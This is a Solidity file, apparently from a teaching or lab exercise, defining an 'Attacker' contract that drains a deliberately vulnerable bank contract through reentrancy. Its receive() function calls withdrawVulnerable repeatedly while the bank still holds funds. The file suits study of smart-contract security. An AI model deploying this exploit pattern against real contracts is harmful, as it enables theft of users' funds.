// SPDX-License-identifier: MIT
pragma solidity ^0.8.30;

import "src/SimpleBankVulnerable.sol";

contract Attacker {

    SimpleBankVulnerable public bank;

    //Hold the amount to withdraw in reentrancy attack
    uint256 public constant REETRANCY_WITHDRAW_AMOUNT = 1;

    constructor(address _bankAddress) payable { 
    bank = SimpleBankVulnerable(_bankAddress);
    }

    // Start the reentrancy attack
    function attack() external {
        bank.withdrawVulnerable(REETRANCY_WITHDRAW_AMOUNT);
    }

    //Function is called when SimpleBankVulnerable sends ETH to this contract
    receive() external payable {
        //Check if the bank still has funds to withdraw
        if (address(bank).balance >= REETRANCY_WITHDRAW_AMOUNT){
            //Reenter the bank contract to withdraw again
            bank.withdrawVulnerable(REETRANCY_WITHDRAW_AMOUNT);
        }
    }

    // Helper function to deposit ETH into the bank
    function deposit() external payable {
    bank.deposit{value: msg.value}(); 
    }

    // Helper function to get the balance of this contract
    function getBalance() external view returns (uint256) {
    return address(this).balance;
}

}
